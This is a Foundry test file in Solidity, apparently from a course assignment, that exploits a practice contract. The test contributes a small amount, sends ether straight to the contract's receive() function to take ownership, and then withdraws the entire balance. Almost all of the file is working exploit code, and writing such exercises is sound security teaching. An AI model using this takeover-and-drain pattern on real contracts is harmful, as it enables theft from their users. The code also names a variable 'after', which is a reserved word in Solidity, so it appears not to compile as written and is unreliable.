// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Foundry standard test utilities
import "forge-std/Test.sol";

// Import the vulnerable contract
import "../src/Assignment11.sol";

contract Assignment11ExploitTest is Test {
    Assignment11 public target;
    address public attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);

        target = new Assignment11();

        // fund the target contract to be drained
        vm.deal(address(target), 1 ether);
    }

    function testExploit() public {
        vm.startPrank(attacker);

        // 1. Make a valid contribution
        target.contribute{value: 0.0005 ether}();

        // 2. Trigger receive() with direct ether send
        (bool success, ) = address(target).call{value: 0.0001 ether}("");
        require(success, "Failed to send ether to fallback");

        // 3. Ensure ownership was transferred
        assertEq(target.owner(), attacker, "Ownership not transferred");

        // 4. Withdraw the contract’s balance
        uint256 before = attacker.balance;
        target.withdraw();
        uint256 after = attacker.balance;

        assertGt(after, before, "Funds were not drained");

        vm.stopPrank();
    }

    // Receive function so the test contract can accept ether if needed
    receive() external payable {}
}
